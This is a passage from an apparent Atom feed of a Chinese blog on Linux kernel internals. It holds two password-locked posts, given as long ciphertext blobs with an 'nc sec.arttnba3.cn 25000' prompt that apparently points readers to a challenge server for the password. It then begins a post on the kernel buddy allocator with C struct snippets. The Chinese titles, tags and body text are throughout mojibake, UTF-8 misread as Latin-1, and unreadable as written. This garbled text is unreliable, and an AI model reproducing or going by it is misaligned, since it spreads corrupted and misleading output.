239263766333b328da136f4fcd9b9bf4af0f035fe5b8a8004719205e871b39f9c0e7e74681977f85678ef578d8e8f134ff691c1bc8848c794e3385d46b16513c90abfb96285b3649dad74a2ab0ee33ac0bd5ab5481c9dedbf55145b74418d73953a9c36e8ed4bd423a4c5d37e8ae2a42b063252ae68c1f26bb5dab38a11d70ca0e9b449744e423cc5336058e5ca9d7b113b1bd7c44a8df3b51278629c699f8aad434918538d4d63a2a3e5f0119481b97b063f2c53c0004ba94eb71d3abbb3a4a7ecc14db25d513abdc48c0489a325ea939dca5cb0d9919d9ccbab77a5b2bae0ba32b116e35990ef00ff8758e44bd6b769e6fcc52f6ce388221df12291dfc58f127ff864b911ecc335799026093a1262631c0c9a9dddbfbd5f4e7cc39c1492026328c9bd9b6ceec5d88ca5a2185b55bbfdc895e7b17188e343c5685ecf1a50c141a8ef5d7df54b626c6e99c7cb14a277a454ffdb4809f79dfa7aaa582985c90c9de3e0669a080bc7c9d4b02f2ba38bd1714103fef9350bb42f34f6142850694addcd01e05b8561c0cc70a1ee24e9217ce39a4ce698ed53633cc1c554c38480a87c4d5dd7b3ea97c84afc3ca82ebf8eb9fc14e37a37a17f82cbf1d821d471e26b2b57a515500beef2b62661d27e21cd04b4b85feebc5e9723202ea4bea7c7b948fd7e13e433c3c20e47d580b651144aa2beb27d9a018752693f0c0ea67c7571b6e48a6dc0fc9bc9f7aa28e702296877f6fe148cac9101a84367fcaaac7cbffca88caa8db5cab4eb0833dc5cef6b962227fca96c8e56e68412037a68da3893da9eb93a57dec819b312f2acd588bad04303d2917d9b7a4feb1126d6ea5d40e5b075afcf9f0a4b43c6e55f572f2877e81e1840e9fcdfc4da7f14f322bc79a2ef7b071c63b41db45111ae9bc8b39a162284e1eb61ae7470faf699f7b5672f87dfa9dc474c21f469523ce21b42302d34345a249956e9189a0e673316d8520eba933fc9a22d3c9de824d44c4428ae47c3cb91b681511a78f5044c1a318eb04d31c85f57a722cd320777701e00c3dc9587d8974298a30764401c74aff5ebfd7535b266bab9dd2e37103c7e193ed512c4ca014fe9b0e19cd886767a867a46406541644d88d3378eaf3e1158a9579c36acf821eef1e3fa2b6e70b2fa6ff901737df2013bd48faf3fa4afaafe852414acf21171c008521ae7b98e7d192f690d906ae68abe18a317c818b3e37e39720f2a58f3860840979eb8570895275a00d03826b6d34ca07d055d86d547df3dd30d353b127da4d83832cd0fb096b27f226f5d5b8b5ba99ed7c04b6c6d49e3e7e954390dbd07d1f79bc291ccd1a11b3f49dd3269bcd7585359a568cade710d66e388a1cb6d5d65ac4d77d8b88c16bbf3b348fcfa8bc1991435468380a42212fcbc714fcab69fda1002007d3fc0e4778925ed752d5b2304df4f63602e3e666ddcb3ada8152aa39b5c9642ad22941a940af89c098b2594e959eb44241894854f138aeddcd6032d828b0c37a467b9bdf687563dabf2cfd571bfaa230901eadf8c7e541258ec9fa23b5631aa18093ec98e1fa2d5f7385e64a2e6904c710e4f586d12a8d991238c040cdf567c60541eb06ef41da905710d446f62488729cd900f04a58aa3c39aaf7970075b9d04be56124cd711c08299c7af0b9211a2e80b8f87ec3cef53301343ab6dcc026e2bf6e9fdb62eaa87ebe783c99caef8c6c04aea63140eb9cf21038f4fc834364ed28a540e1e1966e86e3790eaf8391ec0b7f71f6d7930389be194a89827190561978562c96d28247536d70f3857e56887a164ac9d91f9f963c1e550d0ccbf53278bb23136b11565f45a3eb0344192a86e1cb9adb5b5d890ae632879b31f20ef2892bfc42204cc8e9a069e37935490e90b61ffbe84ae74a7bc5ef69e06a4ff0285e66da4b421b72a9f8010f22735b7439ce6a77a9406d572545375b12b8213d559971e015a6686e85a059fed90a5b625f8e2b65796e351c62a1e8a642625e38dd44ee321f77d3f637778e2c3413f9867e16c00c4c3a5d57769f41d61a2e93c6da3c836795cd79944414ac9c1107616562d72209f7d0f06d6c0dd3208ee738ac5da22c8ab4eba1095f1975cf5422c505de225c6332197823747d877f4d487085f663736c7a6244199f5097aa627faf42c720b4ec91b7a310247f4de4fd2ae5aebfe7724c2bb664386d7bc5e62e571ae0161d945afe42e386879cdb3676687fc5e93d318fb5810708bb5a034df1522c2f2239a476648f093fa0b5a92d9eb3b594ee78a583e18cff6269dd950e03db00aebebeab757cddf9d0d68be06f7e5b708c1e7230a75a6e6ff956623330e813a80585b9b272b8a86287910a05ee742ed45618285a0a29299a72b7fabff0789c14f17c2f39bf97c47a0602fb4ca67f6121dbd6d27c3248717e0967a24e2aa8780e94ce4383998092f81325fbefb7dee8e79ba8982f3ae0bb4d17661c6525ccf2cce5324765a8a8528cf7cd62851f8b7a8bfa3659fb2b12bfa3f33dc9522c46093a0952d0b9e5fa14d16d35ca0ff39e374f6c9764314956314286d385fd4f933273f51d68646a41aa62d39ebfa2ee953d127c69c45831a9db2438722d82cc0d2d4a9b69b4463d0089dcb553b0d536900f3c1434a98639f45032e82548379e94ca8bdf5f61e5a5cc3713b802a158a5db0aa35b720ecaac04f8c7f1a7635d5f4903f3ad561a0d68a1619524d58802da7b330a5e9924b8fb2e00bf21432b2397362326edd2a08b20fb59b3711fb592e2600f7ca52506e6bcb44634dc40dfa8f43d1d79d6be838be9a6fd80b052f16ef5e6b2eab89941838e950d8307534f7363c828d3757c0fa81cfdd641a50972aa4936fc54919569c7a70139f123d4952ac26441524bc42b7b2434df3b5814fe6c6b1d7ca56bbee29268b01de50a3eb181655a1dc0e6974a4c5eee185c4d052e377f31cab0401117d7390ae59b5dc96752e41a506a4ca30a5e2e68e267383d06582e05cef7f4e7103e4ee5303ab6b5a37201924bce48680af7b38ef0958820c55446b4ffe83f9e5ca2bb6a653e54464bf8261a422c9dcf51a1f815f57b207710c465632ce0068bc414e22c3e87ab6ce58955e4abcdcb928fdf1a2254d1aeb90e12f4fd1ff355d7e189fd89f7b91496dd8d10da5e5967ff2d9a0fb15a8dc109d9208bfc12a423d6e5284aedb4465f746a122108dfc9bf03fd4c638f2cd600b24e52813d5b5bf9fe7875c6fb457c56fe9e35ba1b57fcb8879e740a750ade1940e0c91a95b910d5ec7bdd15643578125282fb4039bc73eb4ccc725d87d29a6540a294a13eb7d757787ea4a892e550face13b0b1c3733912badc2f119cf509fc782c4de2307a821c43acd73c6eca358bb0922a132aa8e85f247c10a923f3b7c913934ced26ead22a0b27770067651bff107df2549dea6f870ad1338a160a44e118a556f008b0ef09bc1f504a10526450d30fa75179c8ce7eb3bfafa4608fd6ea583c40065f485c2485d26de229520dcb5449e0e7b9285fd7308aac29a05160a929b203ac02b8531b401fa37385aefd3cb1d70e1006ff8f2d621a10d72334d690dbee2d7b1c4e31a64fb5491b578b9fb4875cab5215af9cd67b4d03012724ab277caedfd734f5ced59466877e53227b666e6b7956c7885c926076c96ed2f3d9f626bb3f44b18e82151fca65fb3d7eafedf44199363bf95942426ee7f0fc3163e9a5844fcaa663ebbc65c22e269f1f7c4769e6c7a84b05489f146b2394f75c6346e99f4c58294e873bee1e30f4fb7456003c458822f0d12a185363a3f7e1328131d8c75a45dbf83fd045b2508d0e52a2db500dae33bc1f0464e9a3dff4811899d149e10cbc9ea57267eea1e1f7d2f3317b07762e70a1d06567dc5c93aa666cdc26fa50d0908ae1d0a5d2943da62978f3947801ec488069375fa40460dba61e5563bc7f8111c9c2e7a69b9e08dc4cf63748219afbc9d8e561d6289955c14c282ca7b48646e49ff21796de8d1896a0c58e34a5efb62b31117a78165bcbb70ca37a84d984adc537880b30d4caf5e8bff73f7f0da0a82e2cc98bc19b23caf7e0963fc585f19c9cc7ffd337aac01853c060a8f0addd0c225f0e57011282f2becad63214c00c5991791f1fa23b23be10e52ab48874cfdedee01d6712b000466e41bea8dc103f570007baca025ed70938b50415a21d5f8d8ebbf073cb9307fdab9777684252e6724acc4897a898f455e127139fb96129b9f48382c028ead69dee7874e71ad3bf41a31234c3bbec200583c70f52ff64342de4ab28fb52e2bfbca82adbd352ed42479da6222ddb0c484cca3e12c472b2a09579f0608a0dddfb24463769737eb19352f93ff2ae4d25f4dd084d33f191e94b3dec68a129224e6d2ad34317f13d5a6690943cdf14f3c8ddd8bf76e3de7d01151b25cbe37ddddd295eed26f694df77d60ad880b7ff2e0631498514bd8e0b0aa6a7c156055deb386e070f9d101ab339c6efaac541681a7c17493c3ec4bfbae7ef4d3fcd9ecf1f83886c656d03f81bd7ebaaa61313e0356ef01b0db9b36f3333de03b41e173b79e9ace7f05df0a4ac4710cdf117ddd8835bbfc49f57dd60c5ba4e569ca5399a14eb709</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">nc sec.arttnba3.cn 25000</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">NEEDY GIRL OVERDOSE</summary>
    
    
    
    <category term="VIRTUALIZATION" scheme="http://blog.arttnba3.cn/categories/VIRTUALIZATION/"/>
    
    
    <category term="å­¦ä¹ æœ­è®°" scheme="http://blog.arttnba3.cn/tags/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    
    <category term="Qemu" scheme="http://blog.arttnba3.cn/tags/Qemu/"/>
    
    <category term="è™šæ‹ŸåŒ–" scheme="http://blog.arttnba3.cn/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
    <category term="PCI" scheme="http://blog.arttnba3.cn/tags/PCI/"/>
    
  </entry>
  
  <entry>
    <title>ã€OS.0x04ã€‘Linux Kernel å†…å­˜ç®¡ç†æµ…æ III - Slub Allocator</title>
    <link href="http://blog.arttnba3.cn/2022/07/07/OS-0X04-LINUX-KERNEL-MEMORY-5.11-PART-III/"/>
    <id>http://blog.arttnba3.cn/2022/07/07/OS-0X04-LINUX-KERNEL-MEMORY-5.11-PART-III/</id>
    <published>2022-07-06T19:33:33.000Z</published>
    <updated>2022-07-21T17:36:26.647Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="é“¾æ¥ï¼šhttps://pan.baidu.com/s/1glFilTF8ua6hI-bklKgJXw æå–ç ï¼šcth0" data-whm="è¿˜è¯·ä¸è¦åšä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„äº‹æƒ…ï¼">  <script id="hbeData" type="hbeData" data-hmacdigest="3c076bbd94b5bca2f3a3bd4a2d03424c80de529ed44e08854e6152d2fc875410">eef143a3a3e51e2ee0b1e9c84de8c53ca1876b7a84e91218d24dea52f0dd7d77785c55722e9e2fbf7a952f922418c19952c5c856fb8a5d793d0924608478d576b0090baf326dfd59bb069e02142c40aa4636762dc6f95977ac9b266625a0d251bd0a77bf6506c3ed1b7ef5af07ad8309340f9094bc9ef06f26e5123efcbbb6c4fbf68530228b7f812e323a593e9116e493981d51777164f2d4df7cdf31c2a9df5f3ea7a1d232f1c2dae24355f79fc0eddf95db5efb7728f9db8cf0acfeca080014bdce79c0990c9d0d7d3f584d55acfb145a9f875a8de1a195c31fc1c3456b0d2334ac1afdd02dc961846915250f61e8ece0b35d0150a89bdf785f1e93ee0ed573376996140f1ac11b21c69b15a0f56063d1ddbb4fcd6f2fa6974ef483838d7d2acc77b12809b45d76d5ed264d4291c69a5ab876c11f40ec4193d7bed5b39283270802b8a582978cdc59f38c54c0c8cf337c9f35f86b78a4780a7ca93ec86806698980801bb8ed7f727cf506b882fdaa7d85164c0665e31d115382e350f272029628857a0a8607e9e2e60c407ea735b51b93e2a7f11ac95c282157dff3c800da32cc44cefa6baa5d0abade02ded9631ba2c9a86e9f500d66cc7a21bfcdcdab2325b04746cafe9e79b9f95c3ff30eecb25cf02903f5faeb92b1ef7bb5c61ef02ea1e16ad014a2c8c244c8f8b81651568d4dd601badf54fe05cd9a9f827acf27acad9feed9a2f80fb2ec81c3f38c951953d3f1a9dd8add75230e7ec3b8f4b379e75aa4b221df5ffe332b921aacb76fc1c9948120b5d3ea719c9808e3f6db529447a1e9ed742f888228079165b3da83f0d7391797cc805329be513af314634ec50183e6c5a6934678827f6704258182090459dbe222594f28b97b6cc03fed6ec57f9ef622d7478504c0df3d40f7c546c57e6d9e2b76aacca98726cd934b5fbee0fb9f2a63dd32782316131d20e47ae403afd23896ee2a9245a4d2be7626e18aa05e3c874bc5e9575da9c9561883e032956810d18c698f8761ea1ee1e292db154ddbc9d68d1e731b4e0a46cf2218e9b9e0941c95a5dac7b9ee162f2cc72df59342797dfb2f1a163226e1e7914c7f1db0397f857e2fb7fee19a1e04fc35f15ff3e5e42e7d209e5645c6f015210ce0d1ea12602f7844a15abb940aedddb8aedccbe1fbfec18524202596541ac8c5da1351e41288b615e4ee44769eec34e9ec852c66e0f207b98801bfabad2639075fe7180d1821006d9d2aa1d4ae4e3806abe12d22ac714a2fcdaf34beef19b0487623b390b514b68052b2e63c73ffa5fc90bbfff75ebc54bbd6c6176b92d3661815f8f7c98960eb32a44feeb36a624d3c5ba9cfab29cd0296278ae906170b4df8fe432256cd7dd1ceb1fb3ba815d68971f57ca39a46d0435374ae58bc1074543f25488c5a0ca55ca9a1e2ab13f7cd46cdf7256eb4ff27d08568e15a05828df520b8d689a565978a6d244fd234da380299329456865ebe6d5ac56b501302a7e410d0787f1effc5154466beadd812b83f3828eb02eb7fb1978dcd8d7390961ceab9d3f25422be3592f75851107e0438be1c46794e57b2bc1fa7df7e141aac5a98c19615e07679b4fdce19fb01c85a6c65c50ca3645bae948e04ffb87f4ad8c0936b783a9b895388cc58a90359cb7c3c640b54c2a507fa34a383bd78aa9cf296103e08806f2cbf35c6abe14791f45b4cebb5024b79d263acc8d2683b71a3a3c92eaf6febfe25462ab4df3b52f45d3e3428f1c237dd059ee34045370f533b375e75d4f5bf5a99832248cc7378783605b2ee26b2fb91f83674b4ba2877576d201cb3a8136acb2dedf8d6ced1b79c2e66c44dc1c5d54368df576ebaeba4cc836a7e623ee4cfe3c62475cc73f066cf14080a77cded78468c008882abefb05b1fe62ae65eb8983804ecdd94a3a532da40687f3cfb7e73402f3fba868b371dbf7ec9587beeefd1fc041b2ce6223a6c76e86afe6817948a583824624b22a0bf52ba88c017d0d9316361bb88a328bba74aa6ba9aafd4ff99b54a3d6afd466c30bda42be7b25a329e4ef750f13e53079d7153b08c2fe43493087e0b80cba63668ee51e19cab45e8b42675c77816ac043f599e9efed638793b6ca59226aa94db19850c21b30a7da783ac2020c83d8ff919e7620c71559de4cf6bd1c9ac59117ac6dc507c124b96a665804f82465993679c5d51fe00715d4786ddd9390ccd2552060ce40ae01c1476f45ab0487095f9b448fbecbdd413e7906d5405a3a2799b298106f0ca432d8b55dae84a1fe1890341ad74d9ccbaca1b8d87cc04e855c2752d9948e1fe410af05401aa9f46ae6d08528f1c69c3d052d62c6920570e927627815f80be9b1d69a1d98fe8a1c56eaca4ab7476fede4f1c8f0c9162295fb2f736936eed25b0b0fc202869c5022592374742b9a1049336f4a1db88f25cf93563c77ff8277190aa82a99732975728117d295d1b11c5e2ede7756fe797618991594f6dea34967482c764d23a508925007e5a508c22a7e8de4728fdd730e9872f7ac48c35d23db270df06e972262483ee14ea068e274803d771752a2414d266951025aa4c074ced72aff61d6db0fe60db3acc739b7e235240e366c5fad1671d1613dd5438b890acf0fcd333c4b327928a7524662bb71d034f33217b26d4a6a70a11653c077e3d75a9b342fc2d1e18b58614e1d81d2d7bebc8740d35e29e4fd1fb5216d5599fae171d71d6b8c8d0b95c51599dc7fbc67c4eebc3bb1702d38bf22ea085510de7e6be42726a6ce19103dd0fd882b52df886daf8e5ae6e598f546e9f12af1520dbdae6b25bf41a630fbc889ff9c23cb4bf73ebb35a16bd54f5859eb94525c243bf0185fcbdcfd2df70c4a9bddec0c9a76d25e645878f1819edbe9d78921732e6cbe1f3e9d1af0c2de7a2fa7769a8e6a54b5bd52df255d73579ccf963ebd8ade1ae1b9a0db6aa225de0666d1d563e019d2f39b486ba949a7aa5ee654b4cd483a2fde8aa138d5633b4de2bb13ac1fb44c0f7ce510281051eeffcc7650e2d23b31936e90db9d07bd2ac61f4feea78c9ad1730527c9e6b3b78b3422a2a091e87fc59931065f448ed7776928ad301fc5458c1945239f205b9fe9c0f0aca477c11ce713d3bb4891ee75a8fb0002aaa9286eab3650f9530cadb13f214d6fa70c3dff01175b020e46488a5f2364cca7f4512b879946d19c4de8daac3b1f5f89fc162f3a4dfa60672bdd95ee5a47bf98a2b58202e5585acc858ee9428dac7c7998ca62057a5074cea898b0c5661261fc56474b3e20ff28aad9210326de7571bf10125e910f41143cc8376bdffa66350f5cb051a44489490b1effa35c295a3ba5f1e08bdf8ed583f996c4f663c903a839b2c9acdc4bf4054bd8375d73e0733205c53ef669d804a1d2d67a076bf4c4f4a6be1e0fe8b0d7b5d002147b08a5930e1fafdbc2d3bfaa89788ef1a3955e4db50e688c0c8f21e7e35f9c0be07b0dc95c5d7f8fdec1a01761aef111765bd46b4a7b8e628e271ca64d74bd80f6ff04e6525868428e5e385663616f42fcfe928e32346f4e36883779e972efc410c1ab09b5660df537b87f25ff6c3aba03dcc0de8ce03e73e5ecb4d1c892137936ead206822b30a40311fd7e13b49f2e3bb6c1d07bffb8ff14e342f5ce161606a86a8110c6d66c258df1bc674c8bda6beae0737e7ac48cdb6a5cb4ca92c00cd2fe9f23249b3d0e490929256eb2051f45de58518aa8769817549bc46312b758276605201f408717dae958843294f36b42996704355006d77506bc1c518056f274c1602a0333130861543639388b3446982493023432a579424f67c50c61afb4bf81e9814060ce09b4366b4e79907e16851bc6ffb62bd65a6a87f6d0546d798016587540574abd9254a3094c40e647b815c6338cb3893285dfc243d0d77d73bd8fb20e00002412b059fd50338e1f0b272acac8ea3e339b79920ca659c6eca169cb3c4efee72ad0f256a617689afe201eff50426ec7d34398d7e9ab5e4f049f34499f67f006e73626ecb044cef07c154a21c4e011a6adaae9127906d25cc802d0089812525967825be34c09bce9328d48d0c1d89cb934f1c65d9e3803ef13f207926f5a206b078a8d924a7b610394d591aefe020137672a6538927f582ec3975c298c6988a16b7776a245714f5d412f0bdd7c34d4a8319d722d3aa96815eab03bd756e399f3704d2d8429e1309abde28b13b5cf15efec3ee0a8c9a3d2131b1773547ed774e4fe34527c98a0e28942b841400704fe02f91e1446c4a8a05bdb9cccdfbff61addd672406a2d5e64a4d35821deab2dccb92cf2737cedc90f092fa5ee2fe05e2b59e09010c7da612d0121a6759978de601227402b857c7fc1e798c84136a51417faa11ee18f18494998a74396402a73b394e6baa8e25cf214ef1184d307df3f630b7503fe9f72ebe87fc6cdfe7bbc4ce2daa486d1d4af26e66715ac56d22af9b840e386c45e4ce789f1daf26a9388afff92cf131d34fff7302c777079147bad3fcf6112345ae86896552ca232b622cef228796a0b6151f773b8ef6ce65448be4f08a7cab56bc3f744fbe6df77488f83d714eb666e20088abe228127ccdc9e95e82e7b13bfe7a7b11e7ec7de722147501f7d437550483385674bac20934ef43f76f45aa101783a6e187fcc133b7b8e118bb3c983f8b8733b755f28177cc420ddf9e0fd02224e3577ad4d05a6f9638028847687447e02be0f8aaf546b9b5403d0facb9191505add6d6acd2c2df8aceaf26d2695f003dc9db33af29aac1b88632c48198607c844978301a3620c078e1f21b5a7435e9bbdbbae6a602033a4f8b5aa04d3d888a91c8d0a901e0bc2c17f8363a50ba2694f859180b6318d606be3e9365e747916e8fbf4ac03978b5360ebbc011f7f41a4f5dded2f3a4a80dc0c88e0920f2257bbec09b7731bb2b049e202911809faa9bc4451ca3b6d809d7e6e6c95853a9a896cd50a806375bf1b46c3e290a40447a4283ba3865c415ec23d03cccce176ad9cbc621988ceab8d846fa8f8f6e5246e8e0fdcc1bb2b21aeb9eaf5c7ee2c62a6e39f63455652d210d85e65b1df58431e46d2600c10dc2dd93f2e4085dd90e49465a8f9205809b357269f4a2599246c7b63ff7d3a87ddbc1022b576bdc58181ae50392be0e9cfa9eb9793b3fdf797b62afc9f33b01ce2f20f61ca43078ec8723cedfae3ca1d5b7ce58b462f2014d2a440015b9237ca690b108b04fbb7941f483214f902c1fb1057909a5a7a3274489142fea3c6a12a966297fd81ac38621646fca730ca18fc0077924944007a63fe6652b03c3e5603e43a64555d0fcfa8f4f38a150e6987cfc4f2a011f9e842252ef1b3599a0a84409b8fa95c57c893ed966a8ab6afd8fb5ea6f8545f6d73424c963d987dbc3a6f20948641cf65c6ffad920a3d57d9f654b6ab78f772c2677b5b314fe54183ad400808eec4eeba1e6d5f0fd888138fa8f6305fb22a8e2f1ca72976cdb7ad04324d664ef69a8322a357834c9c5e20e6be677b8053e479b2c03247a08e3512bd00cc31da67e3a169827c5d220a262ef74585880c960d39a1f7a71cb14fc752fb6cd5a863d3700d2d6576146f3c56310e1ac320783de4ce66fd6fd25f63cbc4ea9c9bf0cf2db43fef399d75da494b909516cbc525e7d439595eaeaae878f1cbdfab06edc173174092c84cc7c2ac3bd59c9d2dd27221b76f51a5dfade15850b88a17159011c3d45115457e749c9767bdb6d0a9941e0eff824aed44abcc8571432f11c91df14d121fbd929874e74375bf67d606c2d874965506452a20fb2fbb892e7e2c34b485a41ff54bb353a23a02afa0c836cea9b352175f9c0197ae733fead42ad2d7b8314064209736e09ec18aec5d49fd50a2d94eeaadda7f0533b721a4e</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">nc sec.arttnba3.cn 25000</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">nc sec.arttnba3.cn 25000</summary>
    
    
    
    <category term="OS" scheme="http://blog.arttnba3.cn/categories/OS/"/>
    
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="å­¦ä¹ æœ­è®°" scheme="http://blog.arttnba3.cn/tags/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="å†…å­˜ç®¡ç†" scheme="http://blog.arttnba3.cn/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    
    <category term="slub allocator" scheme="http://blog.arttnba3.cn/tags/slub-allocator/"/>
    
  </entry>
  
  <entry>
    <title>ã€OS.0x03ã€‘Linux Kernel å†…å­˜ç®¡ç†æµ…æ II - Buddy System</title>
    <link href="http://blog.arttnba3.cn/2022/06/30/OS-0X03-LINUX-KERNEL-MEMORY-5.11-PART-II/"/>
    <id>http://blog.arttnba3.cn/2022/06/30/OS-0X03-LINUX-KERNEL-MEMORY-5.11-PART-II/</id>
    <published>2022-06-30T15:44:49.000Z</published>
    <updated>2022-07-06T19:09:22.512Z</updated>
    
    <content type="html"><![CDATA[<p>HEY DUDE!</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>åœ¨<a href="http://localhost:4000/2021/11/28/OS-0X02-LINUX-KERNEL-MEMORY-5.11-PART-I/">ä¸Šä¸€ç¯‡æ–‡ç« </a>ä¸­ç¬”è€…ç®€è¦é˜è¿°äº† Linux å†…æ ¸å½“ä¸­å†…å­˜çš„åŸºæœ¬ç»„ç»‡æ¶æ„ï¼šé¡µã€åŒºã€èŠ‚ç‚¹ï¼Œåœ¨æœ¬ç¯‡æ–‡ç« å½“ä¸­ç¬”è€…å°†é˜è¿°å†…æ ¸ä¸­æœ€<strong>åŸºç¡€</strong>çš„å†…å­˜åˆ†é…å™¨â€”â€”<strong>Buddy Systen</strong>ï¼ˆä¼™ä¼´ç³»ç»Ÿï¼‰</p><blockquote><p>é€šè¿‡è¯»å– <code>/proc/buddyinfo</code> å¯ä»¥è·å–å½“å‰ç³»ç»Ÿä¸­ buddy system çš„è¯¦ç»†ä¿¡æ¯</p><p><img src="https://i.loli.net/2021/11/30/eRiVXpyUkncYZus.png" alt="image.png"></p><blockquote><p>ç¬”è€…çš„ğŸ’»é…ç½®æ¯”è¾ƒğŸš®ï¼Œæ‰€ä»¥åªæœ‰ä¸€ä¸ª nodeï¼Œéå¸¸æŠ±æ­‰â€¦</p></blockquote></blockquote><blockquote><p>è¿™ç¯‡æ–‡ç« å…¶å®å¾ˆæ—©å°±å†™äº†ä¸ªæ¡†æ¶äº†ï¼Œä½†æ˜¯åé¢ä¸€ç›´æ²¡æœ‰æ¥å¾—åŠè¿›è¡Œè¡¥å®Œâ€¦ï¼ˆå…¶å®å°±æ˜¯æ‡’è€Œå·²å§ï¼ˆæ¼ï¼‰ï¼‰</p><p><img src="https://s2.loli.net/2022/06/08/7VaQ6riZOcmDuEg.png" alt="image.png"></p></blockquote><h1 id="0x01-buddy-system-ä¸­çš„å†…å­˜ç»„ç»‡å½¢å¼"><a href="#0x01-buddy-system-ä¸­çš„å†…å­˜ç»„ç»‡å½¢å¼" class="headerlink" title="0x01.buddy system ä¸­çš„å†…å­˜ç»„ç»‡å½¢å¼"></a>0x01.buddy system ä¸­çš„å†…å­˜ç»„ç»‡å½¢å¼</h1><h2 id="zone-ä¸­çš„-free-area-ç»“æ„ä½“æ•°ç»„"><a href="#zone-ä¸­çš„-free-area-ç»“æ„ä½“æ•°ç»„" class="headerlink" title="zone ä¸­çš„ free_area ç»“æ„ä½“æ•°ç»„"></a>zone ä¸­çš„ free_area ç»“æ„ä½“æ•°ç»„</h2><p>å‰æ–‡ä¸­æˆ‘ä»¬è®²åˆ°ï¼Œæ¯ä¸ª zone ç»“æ„ä½“ä¸­éƒ½æœ‰ä¸€ä¸ª free_area ç»“æ„ä½“æ•°ç»„ï¼Œç”¨ä»¥å­˜å‚¨ buddy system <strong>æŒ‰ç…§ order ç®¡ç†çš„é¡µé¢</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> &#123;</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">free_area</span><span class="title">free_area</span>[<span class="title">MAX_ORDER</span>];</span></span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­çš„ <code>MAX_ORDER</code> ä¸ºä¸€ä¸ªå¸¸é‡ï¼Œå€¼ä¸º 11</p><p>åœ¨ buddy system ä¸­æŒ‰ç…§ç©ºé—²é¡µé¢çš„è¿ç»­å¤§å°è¿›è¡Œåˆ†é˜¶ç®¡ç†ï¼Œè¿™é‡Œçš„ order çš„å®é™…å«ä¹‰ä¸º<strong>è¿ç»­çš„ç©ºé—²é¡µé¢çš„å¤§å°</strong>ï¼Œä¸è¿‡å•ä½ä¸æ˜¯é¡µé¢æ•°ï¼Œè€Œæ˜¯<code>é˜¶</code>ï¼Œå³å¯¹äºæ¯ä¸ªä¸‹æ ‡è€Œè¨€ï¼Œå…¶ä¸­æ‰€å­˜å‚¨çš„é¡µé¢å¤§å°ä¸ºï¼š<br>$$<br>2^{order}<br>$$<br>åœ¨ free_area ä¸­å­˜æ”¾çš„é¡µé¢é€šè¿‡è‡ªèº«çš„ç›¸åº”å­—æ®µè¿æ¥æˆåŒå‘é“¾è¡¨ç»“æ„ï¼Œç”±æ­¤æˆ‘ä»¬å¾—åˆ°è¿™æ ·ä¸€å¼ _Overview_ï¼š</p><p><img src="https://i.loli.net/2021/11/30/sOwdI5YMNUjLSib.png" alt="è‡ªå·±ç”»çš„å›¾.png"></p><p>ä¸‹é¢æˆ‘ä»¬æ¥è§£æ <code>free_area</code> çš„å…·ä½“ç»“æ„ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">free_area</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">free_list</span>[<span class="title">MIGRATE_TYPES</span>];</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>nr_free;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="free-listï¼šç©ºé—²é¡µé¢åŒå‘é“¾è¡¨"><a href="#free-listï¼šç©ºé—²é¡µé¢åŒå‘é“¾è¡¨" class="headerlink" title="free_listï¼šç©ºé—²é¡µé¢åŒå‘é“¾è¡¨"></a>free_listï¼šç©ºé—²é¡µé¢åŒå‘é“¾è¡¨</h3><p>æˆ‘ä»¬ä¸éš¾çœ‹å‡ºï¼šfree_area çš„ free_list å­—æ®µä¾¿æ˜¯ç”¨ä»¥å­˜æ”¾æŒ‡å‘ç©ºé—²é¡µé¢çš„æŒ‡é’ˆï¼Œå…¶é€šè¿‡ page ç»“æ„ä½“çš„ <code>lru</code> å­—æ®µå°† page ç»“æ„ä½“è¿æ¥æˆåŒå‘é“¾è¡¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 